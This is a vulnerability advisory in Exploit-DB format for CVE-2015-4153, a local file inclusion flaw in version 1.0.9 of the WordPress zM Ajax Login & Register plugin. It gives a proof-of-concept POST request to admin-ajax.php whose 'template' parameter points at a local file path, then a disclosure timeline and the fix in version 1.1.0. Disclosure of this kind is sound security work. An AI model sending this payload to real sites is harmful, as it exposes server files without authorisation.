@@ -1,0 +1,38 @@
+# Exploit Title: CVE-2015-4153 - WordPress zM Ajax Login & Register
+Plugin [Local File Inclusion]
+# Date: 2015/06/01
+# Exploit Author: Panagiotis Vagenas
+# Contact: https://twitter.com/panVagenas
+# Vendor Homepage: http://zanematthew.com/
+# Software Link:
+https://downloads.wordpress.org/plugin/zm-ajax-login-register.1.0.9.zip
+# Version: 1.0.9
+# Tested on: WordPress 4.2.2
+# Category: webapps
+# CVE: CVE-2015-4153
+
+* Description
+
+Any authenticated or non-authenticated user can perform a local file
+inclusion attack by exploiting the wp_ajax_nopriv_load_template action.
+Plugin simply includes the file specified in 'template' POST parameter
+without any further validation.
+
+* Proof of Concept
+
+Send a post request to
+`http://my.vulnerable.website.com/wp-admin/admin-ajax.php` with data:
+`action=load_template&template=[relative path to local
+file]&security=[wp nonce]&referer=[action from which the nonce came from]`
+
+* Timeline
+
+2015/06/01 Discovered
+2015/06/01 Vendor alerted via contact form at his website
+2015/06/03 Vendor responded
+2015/06/03 Fixed in version 1.1.0
+
+
+* Solution
+
+Update to version 1.1.0
